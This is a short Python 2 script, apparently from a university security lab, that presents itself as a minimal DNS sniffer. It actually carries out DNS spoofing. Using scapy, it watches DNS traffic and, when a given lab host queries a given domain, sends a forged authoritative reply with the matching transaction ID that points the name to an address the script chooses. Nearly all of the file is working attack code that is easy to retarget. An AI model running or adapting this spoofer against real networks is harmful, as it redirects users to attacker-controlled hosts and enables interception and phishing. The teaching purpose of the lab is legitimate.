"""
Minimal DNS sniffer for Python 2.

Note that this is just a minimal example to get you started and not a perfect 
solution. There are some parts which definitely require change!
"""

import signal
import sys
from scapy.all import sniff, sendp, send, Ether
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
import datetime

def handle_sigint(signum, frame):
    print '\nExiting...'
    sys.exit(0)


def print_packet(packet):
    packet.show()
    if DNS in packet:
        if packet[DNS].qd.qname=="fakeme.seclab.cs.bonn.edu." and packet[IP].src=="10.0.0.5":
            fakePacket = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                         UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / DNS(id=packet[DNS].id,
                         qr=1L, opcode="QUERY", aa=1L, tc=0L, rd=1L, ra=0L, z=0L, rcode="ok",
                         qd=packet[DNS].qd,
                         an=DNSRR(rrname=packet[DNS].qd.qname, type="A", rclass="IN", ttl=86400, rdlen = 4,
                                  rdata="246.67.139.239"))
            # print "### fakePacket:", fakePacket[DNS].id, fakePacket[DNS].an.rrname, \
            #     fakePacket[DNS].an.type, fakePacket[DNS].an.rclass, fakePacket[DNS].an.ttl, 
            #     fakePacket[DNS].an.rdlen, fakePacket[DNS].an.rdata, "\n",\
            #     fakePacket[DNS].qd.qname, fakePacket[DNS].qd.qtype, fakePacket[DNS].qd.qclass, "\n",\
            #     "src:", fakePacket[IP].src, "dst:", fakePacket[IP].dst, "\n",\
            #     "sport:", fakePacket[UDP].sport, "dport:", fakePacket[UDP].dport, "###"
            send(fakePacket)

def start_sniffing():
    signal.signal(signal.SIGINT, handle_sigint)
    print 'Starting to sniff. Hit Ctrl+C to exit...'
    sniff(filter='udp and port 53', prn=print_packet)


def main(argv=None):
    if argv is None:
        argv = sys.argv
    start_sniffing()


if __name__ == '__main__':
    main()
